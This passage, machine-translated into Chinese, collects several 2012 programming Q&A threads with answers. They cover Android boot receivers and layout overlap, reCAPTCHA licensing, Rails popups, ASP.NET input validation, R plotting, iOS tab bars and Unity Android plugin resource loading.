14:50:21.411: E/AndroidRuntime(865): 在java.lang.reflect.Method.invoke(Method.java:511) 12-12 14:50:21.411: E/AndroidRuntime(865): at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java :784) 12-12 14:50:21.411: E/AndroidRuntime(865): 在 com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551) 12-12 14:50:21.411: E/AndroidRuntime (865): 在 dalvik.system.NativeStart.main(Native Method) 12-12 14:50:21.411: E/AndroidRuntime(865): 由: java.lang.NullPointerException 12-12 14:50:21.411: E /AndroidRuntime(865)：在 com.example.servi。MyScheduledActivity.onCreate(MyScheduledActivity.java:22) 12-12 14:50:21.411: E/AndroidRuntime(865): 在 android.app.Activity.performCreate(Activity.java:4465) 12-12 14:50:21.411: E/AndroidRuntime(865): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 12-12 14:50:21.411: E/AndroidRuntime(865): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java :1920) 12-12 14:50:21.411: E/AndroidRuntime(865): ... 11 更多 }1920) 12-12 14:50:21.411: E/AndroidRuntime(865): ... 11 更多 }1920) 12-12 14:50:21.411: E/AndroidRuntime(865): ... 11 更多 }

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.servi"
android:versionCode="1"
android:versionName="1.0" >

<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>

<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="16" />

<application
    android:allowBackup="true"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name="com.example.servi.MainActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

<receiver android:name=".AutoStartNotifyReceiver">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
    </intent-filter>
</receiver>
<receiver android:name="MyScheduledReceiver"></receiver>
<activity android:name="MyScheduledActivity"></activity>
</application>
</manifest> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:26:30.053

来自[http://www.androidsnippets.com/autostart-an-application-at-bootup](http://www.androidsnippets.com/autostart-an-application-at-bootup)

在 AndroidManifest.xml（应用程序部分）中：

```
<receiver android:enabled="true" android:name=".BootUpReceiver"
        android:permission="android.permission.RECEIVE_BOOT_COMPLETED">

        <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <category android:name="android.intent.category.DEFAULT" />
        </intent-filter>
</receiver>
[..]
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
[..]

public class BootUpReceiver extends BroadcastReceiver{

        @Override
        public void onReceive(Context context, Intent intent) {
                Intent i = new Intent(context, MyActivity.class);  
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(i);  
        }

} 
```

您可以使用 Timer 类来使用 TimerTask 安排定期任务。您也可以使用 ScheduledThreadPoolExecutor 类。

*   [http://developer.android.com/reference/java/util/Timer.html](http://developer.android.com/reference/java/util/Timer.html)
*   [http://developer.android.com/reference/java/util/TimerTask.html](http://developer.android.com/reference/java/util/TimerTask.html)
*   [http://developer.android.com/reference/java/util/concurrent/ScheduledThreadPoolExecutor.html](http://developer.android.com/reference/java/util/concurrent/ScheduledThreadPoolExecutor.html)

AlarmManager 可能是一个不错的选择。警报管理器适用于您希望应用程序代码在特定时间运行的情况，即使您的应用程序当前没有运行。

*   [http://developer.android.com/reference/android/app/AlarmManager.html](http://developer.android.com/reference/android/app/AlarmManager.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:17:21.873

在清单中添加一个接收器...用于您的警报接收。在你的情况下；

```
<receiver android:name=".MyScheduledReceiver">

</receiver> 
```

我希望它能解决问题

PS：`MyScheduledActivity`几乎每 600 毫秒后，您的活动将在一秒钟内重复启动两次......所以不要这样做......增加间隔 :) 或者做任何其他事情来检查打印日志或用于测试的东西

# android - 底部重叠滚动视图中的 Android 横幅显示

> ID：13841314
> 
> 赞同：0
> 
> 时间：2012-12-12T13:53:15.990
> 
> 标签：android, banner-ads, adbannerview

我在屏幕底部有一个滚动视图和一个横幅。当方向为横向时，横幅似乎会与内容的滚动视图重叠。如果我在三星 S3 中测试的屏幕尺寸较小，它可能也会重叠。

这是错的吗 ？

```
<?xml version="1.0" encoding="UTF-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <ScrollView
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/scrollView1"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" >

        <LinearLayout
            xmlns:android="http://schemas.android.com/apk/res/android"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:baselineAligned="true"
            android:orientation="vertical" >

            <ImageView
                android:id="@+id/large_photo"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_gravity="top|center_horizontal"
                android:contentDescription="@+id/LargePhoto"
                android:scaleType="center"
                android:src="@drawable/sample" />

            <LinearLayout
                xmlns:android="http://schemas.android.com/apk/res/android"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:baselineAligned="true"
                android:orientation="vertical" >

                <LinearLayout
                    xmlns:android="http://schemas.android.com/apk/res/android"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:baselineAligned="true"
                    android:orientation="vertical" >

                    <RelativeLayout
                        xmlns:android="http://schemas.android.com/apk/res/android"
                        android:layout_width="fill_parent"
                        android:layout_height="wrap_content"
                        android:baselineAligned="true"
                        android:orientation="horizontal"
                        android:paddingTop="2dp" >

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/idReference_no_title"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_marginLeft="5dp"
                            android:text="參考編號"
                            android:textColor="#000000"
                            android:textSize="15dp" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/idReference_no_details"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_marginLeft="5dp"
                            android:layout_toRightOf="@+id/idReference_no_title"
                            android:text="A1234"
                            android:textColor="#0000FF"
                            android:textSize="13dp" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/idHints"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_marginLeft="5dp"
                            android:layout_toLeftOf="@+id/promotion_details"
                            android:text="【按圖顯示】"
                            android:textColor="#FF3300"
                            android:textSize="13dp" />

                        <ImageView
                            android:id="@+id/promotion_details"
                            android:layout_width="30dp"
                            android:layout_height="20dp"
                            android:layout_gravity="right"
                            android:layout_marginLeft="2dp"
                            android:layout_marginRight="2dp"
                            android:layout_toLeftOf="@+id/show_map_details"
                            android:contentDescription="@+id/hasPromotion_details"
                            android:gravity="right|center_vertical"
                            android:paddingRight="2dp"
                            android:scaleType="centerInside"
                            android:src="@drawable/promotion" />

                        <ImageView
                            android:id="@+id/show_map_details"
                            android:layout_width="30dp"
                            android:layout_height="20dp"
                            android:layout_gravity="right"
                            android:layout_marginLeft="2dp"
                            android:layout_marginRight="2dp"
                            android:layout_toLeftOf="@+id/show_street"
                            android:contentDescription="@+id/show_map_details_name"
                            android:gravity="right|center_vertical"
                            android:paddingRight="2dp"
                            android:scaleType="centerInside"
                            android:src="@drawable/googlemap" />

                        <ImageView
                            android:id="@+id/show_street"
                            android:layout_width="30dp"
                            android:layout_height="20dp"
                            android:layout_alignParentRight="true"
                            android:layout_gravity="right"
                            android:layout_marginLeft="2dp"
                            android:layout_marginRight="2dp"
                            android:contentDescription="@+id/show_street_desc"
                            android:gravity="right|center_vertical"
                            android:paddingRight="8dp"
                            android:scaleType="centerInside"
                            android:src="@drawable/street" />
                    </RelativeLayout>
>

                    <LinearLayout
                        xmlns:android="http://schemas.android.com/apk/res/android"
                        android:layout_width="fill_parent"
                        android:layout_height="wrap_content"
                        android:baselineAligned="true"
                        android:orientation="horizontal" >

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_marginLeft="5dp"
                            android:text="詳細地址"
                            android:textColor="#000000"
                            android:textSize="15dp" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/HouseMall_Address_details"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_marginLeft="5dp"
                            android:text="AAAAAA"
                            android:textColor="#0000FF"
                            android:textSize="13dp" />
                    </LinearLayout>

                    <LinearLayout
                        xmlns:android="http://schemas.android.com/apk/res/android"
                        android:layout_width="fill_parent"
                        android:layout_height="wrap_content"
                        android:baselineAligned="true"
                        android:orientation="horizontal" >

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_marginLeft="5dp"
                            android:text="室內／外"
                            android:textColor="#000000"
                            android:textSize="15dp" />

                        <ImageView
                            android:id="@+id/indoor_or_outdoor_details"
                            android:layout_width="30dp"
                            android:layout_height="20dp"
                            android:layout_gravity="left"
                            android:layout_marginLeft="2dp"
                            android:layout_marginRight="2dp"
                            android:contentDescription="@+id/indoor_outdoor_details_name"
                            android:gravity="left|center_vertical"
                            android:paddingRight="2dp"
                            android:scaleType="centerInside"
                            android:src="@drawable/indoor_18x18" />
                    </LinearLayout>
                </LinearLayout>

                <TableLayout
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:paddingLeft="10dp"
                    android:paddingRight="15dp"
                    android:paddingTop="2dp" >

                    <TableRow>

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="提供泊車種類"
                            android:textColor="#000000"
                            android:textSize="15dp"
                            android:textStyle="bold" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="時租"
                            android:textColor="#000000"
                            android:textSize="15dp"
                            android:textStyle="bold" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="日泊"
                            android:textColor="#000000"
                            android:textSize="15dp"
                            android:textStyle="bold" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="夜泊"
                            android:textColor="#000000"
                            android:textSize="15dp"
                            android:textStyle="bold" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="全日泊"
                            android:textColor="#000000"
                            android:textSize="15dp"
                            android:textStyle="bold" />
                    </TableRow>

                    <TableRow>

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="收費 星期一至五"
                            android:textColor="#000000"
                            android:textSize="15dp"
                            android:textStyle="bold" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/Hour_MonToFri"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="$18"
                            android:textColor="#000000"
                            android:textSize="13dp" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/Day_MonToFri"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="$60"
                            android:textColor="#000000"
                            android:textSize="13dp" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/Night_MonToFri"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="$60"
                            android:textColor="#000000"
                            android:textSize="13dp" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/W24_MonToFri"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="$60"
                            android:textColor="#000000"
                            android:textSize="13dp" />
                    </TableRow>

                    <TableRow>

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="星期六日及假期"
                            android:textColor="#000000"
                            android:textSize="15dp"
                            android:textStyle="bold" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/Hour_SatToSun"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="$60"
                            android:textColor="#000000"
                            android:textSize="13dp" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/Day_SatToSun"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="$60"
                            android:textColor="#000000"
                            android:textSize="13dp" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/Night_SatToSun"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="$60"
                            android:textColor="#000000"
                            android:textSize="13dp" />

                        <TextView
                            xmlns:android="http://schemas.android.com/apk/res/android"
                            android:id="@+id/W24_SatToSun"
                            android:layout_width="wrap_content"
                            android:layout_height="wrap_content"
                            android:layout_weight="0.2"
                            android:gravity="right"
                            android:text="$60"
                            android:textColor="#000000"
                            android:textSize="13dp" />
                    </TableRow>
                </TableLayout>

                <TableLayout
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:paddingLeft="10dp"
                    android:paddingRight="15dp"
                    android:paddingTop="2dp" >

                    <TextView
                        xmlns:android="http://schemas.android.com/apk/res/android"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:gravity="left"
                        android:text="月租"
                        android:textColor="#000000"
                        android:textSize="15dp"
                        android:textStyle="bold" />

                    <TextView
                        xmlns:android="http://schemas.android.com/apk/res/android"
                        android:id="@+id/Monthly_Fee"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:gravity="left"
                        android:text="$2400"
                        android:textColor="#000000"
                        android:textSize="13dp" />
                </TableLayout>

                <LinearLayout
                    xmlns:android="http://schemas.android.com/apk/res/android"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:baselineAligned="true"
                    android:orientation="horizontal"
                    android:paddingTop="4dp" >

                    <TextView
                        xmlns:android="http://schemas.android.com/apk/res/android"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="付款方法"
                        android:textColor="#000000"
                        android:textSize="15dp" />

                    <ImageView
                        android:id="@+id/paid_octopus_details"
                        android:layout_width="30dp"
                        android:layout_height="20dp"
                        android:layout_gravity="center"
                        android:layout_marginLeft="2dp"
                        android:layout_marginRight="2dp"
                        android:contentDescription="@+id/paid_octopus_desc_details"
                        android:gravity="left|center_vertical"
                        android:paddingRight="2dp"
                        android:scaleType="centerInside"
                        android:src="@drawable/octopus" />

                    <ImageView
                        android:id="@+id/paid_visa_details"
                        android:layout_width="30dp"
                        android:layout_height="20dp"
                        android:layout_gravity="center"
                        android:layout_marginLeft="2dp"
                        android:layout_marginRight="2dp"
                        android:contentDescription="@+id/paid_visa_desc_details"
                        android:gravity="left|center_vertical"
                        android:paddingRight="2dp"
                        android:scaleType="centerInside"
                        android:src="@drawable/visa" />

                    <ImageView
                        android:id="@+id/paid_cash_details"
                        android:layout_width="30dp"
                        android:layout_height="20dp"
                        android:layout_gravity="center"
                        android:layout_marginLeft="2dp"
                        android:layout_marginRight="2dp"
                        android:contentDescription="@+id/paid_cash_desc_details"
                        android:gravity="left|center_vertical"
                        android:paddingRight="2dp"
                        android:scaleType="centerInside"
                        android:src="@drawable/cash" />
                </LinearLayout>

                <LinearLayout
                    xmlns:android="http://schemas.android.com/apk/res/android"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:baselineAligned="true"
                    android:orientation="horizontal" >

                    <TextView
                        xmlns:android="http://schemas.android.com/apk/res/android"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="其他設施"
                        android:textColor="#000000"
                        android:textSize="15dp" />

                    <ImageView
                        android:id="@+id/charger_details"
                        android:layout_width="30dp"
                        android:layout_height="20dp"
                        android:layout_gravity="center"
                        android:layout_marginLeft="2dp"
                        android:layout_marginRight="2dp"
                        android:contentDescription="@+id/charger_desc_details"
                        android:gravity="left|center_vertical"
                        android:paddingRight="2dp"
                        android:scaleType="centerInside"
                        android:src="@drawable/recharge" />

                    <ImageView
                        android:id="@+id/wash_details"
                        android:layout_width="30dp"
                        android:layout_height="20dp"
                        android:layout_gravity="center"
                        android:layout_marginLeft="2dp"
                        android:layout_marginRight="2dp"
                        android:contentDescription="@+id/wash_desc_details"
                        android:gravity="left|center_vertical"
                        android:paddingRight="2dp"
                        android:scaleType="centerInside"
                        android:src="@drawable/carwash" />

                    <ImageView
                        android:id="@+id/cctv_details"
                        android:layout_width="30dp"
                        android:layout_height="20dp"
                        android:layout_gravity="center"
                        android:layout_marginLeft="2dp"
                        android:layout_marginRight="2dp"
                        android:contentDescription="@+id/cctv_desc_details"
                        android:gravity="left|center_vertical"
                        android:paddingRight="2dp"
                        android:scaleType="centerInside"
                        android:src="@drawable/cctv" />
                </LinearLayout>
            </LinearLayout>
        </LinearLayout>
    </ScrollView>

    <ImageView
        android:id="@+id/page_ad_specificregion_details"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_centerHorizontal="true"
        android:scaleType="centerInside"
        android:src="@drawable/page_ad_sample" />

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:35:47.923

只需移动您的`Banner-ImageView`“之前”`ScrollView`并将以下行添加到您的`ScrollView`

```
android:layout_above="@id/page_ad_specificregion_details" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T04:59:14.573

如果遇到问题，请尝试此操作，然后重播，否则给予 +1。

使用此代码更改最后一个图像视图。

```
<ImageView
    android:id="@+id/page_ad_specificregion_details"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_centerHorizontal="true"
    android:paddingTop="5dip" /> 
```

# recaptcha - 如何在我的单一商业产品中使用 reCAPTCHA

> ID：13841318
> 
> 赞同：2
> 
> 时间：2012-12-12T13:53:30.750
> 
> 标签：recaptcha

我不明白如何将 reCAPTCHA 集成到单个商业产品中，有什么想法吗？据我所知，应该使用 API Key 为每个单个域激活它，但单个产品不能自动执行此操作。如果没有任何方法，商业产品是否有任何完全自由（不是 GPL）的解决方案？

# jquery-ui - 如何在 Rails 3.2 的 Popbox 中填充嵌套模型信息？

> ID：13841321
> 
> 赞同：1
> 
> 时间：2012-12-12T13:53:43.183
> 
> 标签：jquery-ui, ruby-on-rails-3.2, nested-forms

我的系统中有一个请求模型和一个嵌套关键字模型。我想单击请求索引页面中的“添加关键字”按钮或链接，并希望在弹出框中填写关键字信息。我不想打开新页面。

起初，我使用了 Ryan Bates 的[Nested Model Form](http://railscasts.com/episodes/196-nested-model-form-revised)。但是我的模型非常具体，因此它们使页面很长。我不想让页面如此垂直。我只是不想一直上下滚动。

看了这么多，这里也有很多问题。但是我没有找到具体的解决方案。你能帮我吗？谢谢。

# validation - 你怎么允许 ，和标签不允许在 ASP.net 中使用其他标签

> ID：13841327
> 
> 赞同：0
> 
> 时间：2012-12-12T13:53:54.193
> 
> 标签：validation

当我尝试提交表单时，我总是收到此错误：
`A potentially dangerous Request.Form value was detected from the client`

我不想禁用

```
ValidateRequest="false" 
```

我想重新使用检查危险内容的 .NET Framework 代码，只是我只想允许`<b>`and`<i>`标记

# r - 在单个图中绘制多个表

> ID：13841328
> 
> 赞同：3
> 
> 时间：2012-12-12T13:53:57.770
> 
> 标签：r, plot

我有 11 个时间序列，其中包括一个温度列。换句话说，有 11 个表格应该以不同颜色或线型的线条呈现在一个图中。

```
 t1      t2      t3      t4      t5      t6      t7       t8     t9      t10      t11
 4.14    4.12    4.09    4.07    4.14    4.14    4.12    4.09    4.07    5.70    42.67 
 4.01    3.99    3.97    3.94    4.01    4.01    3.99    3.97    3.94    4.14    39.98 
 3.89    3.86    3.84    3.82    3.89    3.89    3.86    3.84    3.82    4.01    38.73 
 3.77    3.74    3.72    3.69    3.77    3.77    3.74    3.72    3.69    3.89    37.50 
 3.64    3.62    3.59    3.57    3.64    3.64    3.62    3.59    3.57    3.77    36.25 
  3.52   3.50    3.48    3.45    3.52    3.52    3.50    3.48    3.45    3.64    35.07 
  3.40   3.38    3.35    3.33    3.40    3.40    3.38    3.35    3.33    3.52    33.86 
  3.27   3.24    3.22    3.19    3.27    3.27    3.24    3.22    3.19    3.40    32.52 
  3.13   3.10    3.07    3.05    3.13    3.13    3.10    3.07    3.05    3.27    31.11 
  2.99   2.96    2.94    2.91    2.99    2.99    2.96    2.94    2.91    3.13    29.73 
  2.85   2.81    2.78    2.75    2.85    2.85    2.81    2.78    2.75    2.99    28.23 
  2.69   2.66    2.63    2.59    2.69    2.69    2.66    2.63    2.59    2.85    26.69 
  2.53   2.49    2.46    2.42    2.53    2.53    2.49    2.46    2.42    2.69    25.01 
  2.36   2.33    2.29    2.26    2.36    2.36    2.33    2.29    2.26    2.53    23.36 
  2.19   2.16    2.13    2.10    2.19    2.19    2.16    2.13    2.10    2.36    21.74 
  2.05   2.02    1.98    1.95    2.05    2.05    2.02    1.98    1.95    2.19    20.24 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:18:38.903

一种选择是：

1.  使用 melt 重塑数据
2.  ggplot2 绘制熔化数据

    ```
     dat$date <- seq(as.Date('2011-01-01'),as.Date('2011-01-31'),
     length.out=dim(dat)[1])
     library(reshape2)
     dat.m <- melt(dat,id='date')
     library(ggplot2)
     qplot(data=subset(dat.m),x= date, y=value,color=variable, geom='line') 
    ```

![在此处输入图像描述](../Images/819bed5024a9dd7ea96b45eb8e69a063.png)

我从数据集中删除 t11 变量并重新绘制

```
 qplot(data=subset(dat.m, variable != 't11'),x= date, y=value,
        color=variable, geom='line') 
```

![在此处输入图像描述](../Images/caac3863ff7ebbffc92df8cd1229152d.png)

# iphone - 如何将用户带回 TabBarcontroller 中的第一个选项卡

> ID：13841329
> 
> 赞同：0
> 
> 时间：2012-12-12T13:53:58.673
> 
> 标签：iphone, xcode4.5, tabbarcontroller

我在我的应用程序中使用 Tabbarcontroller。我添加了一个 tabbarcontroller 作为根视图来委派，其中也有 5 个选项卡。现在问题来了，我在委托窗口上添加了一个注销按钮，它显示在导航栏右侧的所有视图顶部。我使用了一个注销按钮，以便用户可以从任何选项卡注销并返回到 tabBar 控制器的第一个选项卡，但它不会发生在我身上。任何人都可以建议我怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T13:59:29.273

尝试这个

```
[yourTabBarController setSelectedIndex:0] 
```

或者

```
[tabBar setSelectedItem:[tabBar.items objectAtIndex:0]]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:03:20.420

你可以设置你的`selectedViewController`属性`UITabBarController`。文档说：

> “您可以使用此属性来选择 viewControllers 属性中的任何视图控制器”

例如，您可以`UITabBarController`使用以下方法创建一个类别：

```
- (void)selectFirstController {
    self.selectedViewController = [self.viewControllers objectAtIndex:0];
} 
```

# android - 库插件 :: 未找到库资源

> ID：13841331
> 
> 赞同：4
> 
> 时间：2012-12-12T13:54:08.430
> 
> 标签：android, plugins, unity3d

我目前正在将 Android 库转换为 Unity 插件。我已经走了很长一段路，但现在我被困在无法从 Unity 访问图书馆资源的地步。

该应用程序运行良好，直到我真正从库中调用一个视图。这是我当时收到的错误日志：

```
12-12 13:37:36.495: W/ResourceType(32155): getEntry failing because entryIndex 1 is beyond type entryCount 1
12-12 13:37:36.495: W/ResourceType(32155): Failure getting entry for 0x7f030001 (t=2 e=1) in package 0 (error -2147483647)
12-12 13:37:36.500: D/AndroidRuntime(32155): Shutting down VM
12-12 13:37:36.500: W/dalvikvm(32155): threadid=1: thread exiting with uncaught exception (group=0x4109a2a0)
12-12 13:37:36.505: E/AndroidRuntime(32155): FATAL EXCEPTION: main
12-12 13:37:36.505: E/AndroidRuntime(32155): android.content.res.Resources$NotFoundException: Resource ID #0x7f030001
12-12 13:37:36.505: E/AndroidRuntime(32155): at android.content.res.Resources.getValue(Resources.j ava:1026)
12-12 13:37:36.505: E/AndroidRuntime(32155): at android.content.res.Resources.loadXmlResourceParse r(Resources.java:2131)
12-12 13:37:36.505: E/AndroidRuntime(32155): at android.content.res.Resources.getLayout(Resources. java:865)
12-12 13:37:36.505: E/AndroidRuntime(32155): at android.view.LayoutInflater.inflate(LayoutInflater .java:394)
12-12 13:37:36.505: E/AndroidRuntime(32155): at android.view.LayoutInflater.inflate(LayoutInflater .java:352)
12-12 13:37:36.505: E/AndroidRuntime(32155): at com.mycompany.mylibrary.components.AndroidWebViewD ialog.<init>(AndroidWebViewDialog.java:140)
12-12 13:37:36.505: E/AndroidRuntime(32155): at com.mycompany.mylibrary.FunctionAndroidLibrary.Sho wDialog(FunctionAndroidLibrary.java:163)
12-12 13:37:36.505: E/AndroidRuntime(32155): at com.mycompany.mylibrary.FunctionAndroidLibrary.but tonREGISTER(FunctionAndroidLibrary.java:94)
12-12 13:37:36.505: E/AndroidRuntime(32155): at com.mycompany.myUnityProjectAndroidLibraryTest$1.r un(AndroidLibraryTest.java:78)
12-12 13:37:36.505: E/AndroidRuntime(32155): at android.os.Handler.handleCallback(Handler.java:615 )
12-12 13:37:36.505: E/AndroidRuntime(32155): at android.os.Handler.dispatchMessage(Handler.java:92 )
12-12 13:37:36.505: E/AndroidRuntime(32155): at android.os.Looper.loop(Looper.java:137)
12-12 13:37:36.505: E/AndroidRuntime(32155): at android.app.ActivityThread.main(ActivityThread.jav a:4898)
12-12 13:37:36.505: E/AndroidRuntime(32155): at java.lang.reflect.Method.invokeNative(Native Method)
12-12 13:37:36.505: E/AndroidRuntime(32155): at java.lang.reflect.Method.invoke(Method.java:511)
12-12 13:37:36.505: E/AndroidRuntime(32155): at com.android.internal.os.ZygoteInit$MethodAndArgsCa ller.run(ZygoteInit.java:1006)
12-12 13:37:36.505: E/AndroidRuntime(32155): at com.android.internal.os.ZygoteInit.main(ZygoteInit .java:773)
12-12 13:37:36.505: E/AndroidRuntime(32155): at dalvik.system.NativeStart.main(Native Method) 
```

*   这些资源实际存在于库`.jar`文件中。
*   `setContentView()`已从 Unity Android 项目中禁用

有谁能帮忙吗？先感谢您！

**[编辑]** 我想我在这里找到了问题： [http ://tools.android.com/recent/dealingwithdependenciesinandroidprojects](http://tools.android.com/recent/dealingwithdependenciesinandroidprojects)

```
Important change: We have changed the way Library Projects generate and package R classes:
The R class is not packaged in the jar output of Library Projects anymore.
Library Project do not generate the R class for Library Projects they depend on. Only main application projects generates the Library R classes alongside their own. 
```

有谁知道结合 Unity3D 解决这个问题的最佳解决方案是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-03T06:19:59.137

实际上是由于Unity3D的后期打包过程不当造成的。**它在 aapt 生成包含资源 id 的 R 类之前生成 dex 文件**。所以你没有机会依赖静态资源 id。

我已经通过为 Unity3D 编写了一个编辑器插件解决了这个问题。但是我现在不能发布它，因为它有问题而且我现在太忙了，无法修复它。

但是由于你的问题是移植代码。我建议你在java中更改你的资源加载代码以采用Unity3D引起的这个问题。

```
// context should be the activity of your unity3d application which raise the call to your plugin.

// Loading string
String myResString = context.getResources().getString(
        context.getResources().getIdentifier("sample_string",
                                             "string",
                                             context.getPackageName()));

// Loading image
AlertDialog.Builder tDialog = new AlertDialog.Builder(context);
tDialog.setIcon(
      context.getResources().getIdentifier("sample_icon", "drawable", context.getPackageName())
); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-17T02:45:55.697

我遇到了同样的问题，但在 Unity 4.3 上找到了一种干净的方法。

我正在将 Google Play 游戏服务库与我自己的 Java 代码集成，并从中制作一个插件。

首先确保库项目被标记为您的 Android 项目的库。从eclipse导出jar时，导出派生项目的res文件夹，而不是库项目。库项目中的资源会自动合并到您的派生项目中。在这一步之后，你应该有一个包含类文件的 jar 和一个 res 文件夹。

从 jar 中提取此 res 文件夹并将其放在 Plugins/Android 文件夹中。

现在，当您从 Unity 构建项目时，它应该可以正常工作。

编辑：我认为您可以将派生项目的 res 文件夹直接复制到 Unity 的 Plugins/Android 文件夹中。无需导出到 jar 中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-17T14:22:29.343

请参阅以下帖子：

[Unity Android 项目中的自定义资源](http://www.twodee.org/blog/?p=4951)

它显示了问题所在以及如何检索资源 ID。

* * *

## 回答 #4

> 赞同：-1
> 
